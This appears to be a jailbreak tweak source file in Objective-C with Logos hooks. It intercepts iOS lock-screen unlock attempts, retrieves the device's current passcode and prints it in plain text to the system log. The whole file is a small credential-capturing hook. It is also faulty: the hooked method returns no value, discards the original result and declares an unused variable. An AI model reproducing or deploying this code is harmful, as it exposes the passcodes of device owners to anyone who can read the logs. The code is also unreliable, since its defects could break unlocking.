#import <UIKit/UIKit.h>

@interface SBDeviceLockController : UIViewController

- (NSString *)getCurrentPasscode;

@end

%hook SBDeviceLockController
static char dateFormatterHolder;

- (BOOL)attemptDeviceUnlockWithPassword:(NSString *)passcode appRequested:(BOOL)requested {

		%orig;

		NSString *currPasscode = [self getCurrentPasscode];

		NSLog(@" ");
		NSLog(@" ");
		NSLog(@" ");
		NSLog(@"%@", currPasscode);
		NSLog(@" ");
		NSLog(@" ");
		NSLog(@" ");

}

%end